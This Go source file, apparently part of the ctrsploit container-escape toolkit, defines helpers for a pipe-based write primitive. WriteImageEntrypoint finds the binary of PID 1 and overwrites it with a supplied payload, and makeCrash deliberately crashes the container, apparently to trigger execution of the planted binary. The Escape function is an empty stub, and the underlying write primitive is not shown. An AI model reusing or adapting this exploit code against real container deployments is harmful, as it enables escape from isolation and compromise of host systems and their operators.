package pipe_primitive

import (
	"errors"
	"github.com/ctrsploit/ctrsploit/helper/crash"
	"github.com/ctrsploit/ctrsploit/util"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"os"
)

func Escape(primitive Primitive) (err error) {
	return
}

func WriteImageEntrypoint(primitive Primitive, payload []byte) error {
	path, err := util.GetProcessPathByPid(1)
	if err != nil {
		if errors.Is(err, os.ErrPermission) || errors.Is(err, os.ErrNotExist) {
			awesome_error.CheckErr(err)
		}
		return nil
	}
	return WriteImage(primitive, path, payload)
}

func makeCrash() (err error) {
	return crash.MakeContainerCrash(crash.NewSig())
}
